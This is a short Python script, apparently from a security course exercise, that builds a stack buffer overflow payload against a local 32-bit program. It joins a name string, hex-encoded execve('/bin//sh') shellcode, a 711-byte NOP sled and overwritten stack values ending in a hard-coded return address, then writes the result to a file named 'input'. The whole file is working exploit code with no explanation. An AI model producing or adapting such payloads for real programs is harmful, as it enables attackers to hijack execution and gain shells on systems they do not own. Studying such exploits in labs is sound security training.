import binascii

def fixEndian(b):
        c = b[6:8]
        c += b[4:6]
        c += b[2:4]
        c += b[0:2]
        return c

myName = "Mark Thompson".encode()
shcode = '90909031c050686e2f7368682f2f626989e35089e25389e1b00bcd80'
shcode = binascii.a2b_hex(''.join(shcode))
retAdr = 'bffff3e0'
nameAdr= 'bffff3c0'

#s=[nameAdr,'000002e1','0804b008','0000030c','b7fcdac0','00000004','bffff6d8', retAdr]

s2 =['d0f3ffbf', 'e1020000', '08b00408', 'fc020000','c0dafcb7', '04000000', '08f7ffbf', fixEndian(retAdr)]

sp = ''
for i in range(len(s2)):
        sp += s2[i]

#create long buffer string, using NOP code 90. 
buffLen = 711
print("bufflen = ")
print(buffLen)
buffString = binascii.a2b_hex(''.join("90"*buffLen))

retAdr = binascii.a2b_hex(''.join(retAdr))
sp = binascii.a2b_hex(''.join(sp))

by = myName + shcode + buffString + sp 
         # return address that should overwrite the existing return address and send code to shell code
f = open('input','wb')
f.write(by)
